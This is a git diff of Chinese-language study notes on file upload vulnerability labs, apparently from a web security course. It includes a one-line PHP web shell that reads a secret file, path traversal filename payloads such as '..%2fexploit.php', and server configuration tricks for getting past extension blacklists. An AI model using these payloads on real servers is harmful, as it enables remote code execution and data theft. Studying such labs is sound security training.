@@ -11,7 +11,7 @@ PHP
 ## Lab: Remote code execution via web shell upload
 -  圖片上傳功能
 - 不會對其進行任何驗證 
-- upload exploit.php (<?php echo file_get_contents('/home/carlos/secret'); ?>)
+- upload exploit.php (<"?php echo file_get_contents('/home/carlos/secret'); ?">)
 - GET /files/avatars/exploit.php HTTP/1.1 <br>
 
 防禦措施
@@ -28,3 +28,16 @@ PHP
 
 ## Lab: Web shell upload via path traversal
 - Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+- filename="..%2fexploit.php"
+- GET /files/exploit.php <br>
+
+黑名單
+- 鮮為人知的替代檔案副檔名 e.g .php5 .shtml
+- /etc/apache2/apache2.conf
+    - LoadModule php_module /usr/lib/apache2/modules/libphp.so
+        AddType application/x-httpd-php .php
+- Apache 伺服器 : (.htaccess)
+- IIS 伺服器 : (web.config)
+    -<pre> <staticContent>
+        <mimeMap fileExtension=".json" mimeType="application/json" />
+        </staticContent>
